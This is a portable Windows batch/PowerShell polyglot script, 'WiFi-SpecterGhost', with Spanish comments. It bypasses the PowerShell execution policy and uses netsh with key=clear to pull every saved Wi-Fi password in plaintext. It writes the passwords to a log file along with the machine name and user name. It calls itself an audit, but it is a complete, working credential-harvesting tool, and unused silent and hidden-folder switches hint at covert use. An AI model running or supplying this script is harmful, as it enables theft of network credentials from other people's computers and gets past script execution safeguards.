<# :
@echo off
:: WiFi-SpecterGhost [Normal Mode]
:: Este archivo es portable e independiente.
powershell -ExecutionPolicy Bypass -Command "iex (Get-Content '%~f0' -Raw)"
pause
exit /b
#>

# --- WiFi-SpecterGhost Engine [Embedded - Universal] ---
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

$Silent = $false
$UseHiddenFolder = $false
$OutputName = "wpsd.txt"
$FolderName = "logs"

$scriptDirectory = $PSScriptRoot
if (-not $scriptDirectory) { $scriptDirectory = Get-Location }

# --- Configuracion de rutas y nombres ---
$targetFolder = $scriptDirectory

# Logica de incremento
$baseName = [System.IO.Path]::GetFileNameWithoutExtension($OutputName)
$extension = [System.IO.Path]::GetExtension($OutputName)
$finalOutputName = $OutputName
$counter = 1

while (Test-Path (Join-Path -Path $targetFolder -ChildPath $finalOutputName)) {
    $finalOutputName = "$baseName.$counter$extension"
    $counter++
}

$outputFilePath = Join-Path -Path $targetFolder -ChildPath $finalOutputName

# Escribir encabezado de metadata
try {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    
    $header = @"
=========================================
 AUDITORIA: WiFi-SpecterGhost            
 FECHA    : $timestamp                   
 EQUIPO   : $computerName                
 USUARIO  : $userName                    
=========================================
"@
    $header | Add-Content -Path $outputFilePath -Encoding UTF8
} catch { }

Write-Host @"
   _  _ _ ___ _    ___             _             ___ _               _   
  | || (_) __(_)  / __|_ __  ___ _| |_ ___ _ _ / __| |_  ___  ___ _| |_ 
  | __ | | _|| |  \__ \ '_ \/ -_) _|  _/ -_) '_| (_ | ' \/ _ \(_- <|  _|
  |_||_|_|_| |_|  |___/ .__/\___|\__|\__\___|_|  \___|_||_\___//__/ \__|
                      |_| Universal Engine v2.0
"@ -ForegroundColor Yellow

$foundCount = 0
Write-Host "Iniciando escaneo de redes guardadas..." -ForegroundColor Cyan

# Obtener perfiles - Regex agnostico (indentacion 4+ y colon)
$profilesOutput = (netsh wlan show profiles 2>$null)
$profileLines = $profilesOutput | Where-Object { $_ -match '^\s{4,}.+:\s+(.+)$' }

if (-not $profileLines) {
    Write-Host "No se encontraron perfiles guardados." -ForegroundColor Yellow
} else {
    foreach ($line in $profileLines) {
        if ($line -match ':\s*(.+)$') {
            $profileName = $matches[1].Trim()
            $password = "[No encontrada]"

            try {
                $profileDetailOutput = (netsh wlan show profile name="$profileName" key=clear 2>$null)
                foreach ($dLine in $profileDetailOutput) {
                    if ($dLine -match '(?:Autenticacion|Authentication)\s*:\s*(?:Abierta|Open)') {
                        $password = "[Red Abierta / Sin Clave]"
                    }
                    if ($dLine -match '(?:Contenido de la clave|Key Content|Key Material)\s*:\s*(.+)$') {
                        $password = $matches[1].Trim()
                        break
                    }
                }
            } catch { continue }

            try {
                "SSID: $profileName" | Add-Content -Path $outputFilePath -Encoding UTF8
                "PWD: $password" | Add-Content -Path $outputFilePath -Encoding UTF8
                "-----------------------------------------" | Add-Content -Path $outputFilePath -Encoding UTF8
                Write-Host "SSID: $profileName | PWD: $password" -ForegroundColor Green
                $foundCount++
            } catch { }
        }
    }
}

Write-Host "-----------------------------------------" -ForegroundColor DarkGray
Write-Host "Escaneo completado. Se encontraron $foundCount redes." -ForegroundColor Green
Write-Host "Archivo generado: $finalOutputName" -ForegroundColor Cyan
Write-Host "Ubicacion: $targetFolder" -ForegroundColor DarkCyan
Write-Host "Listo! El trabajo esta hecho." -ForegroundColor Cyan

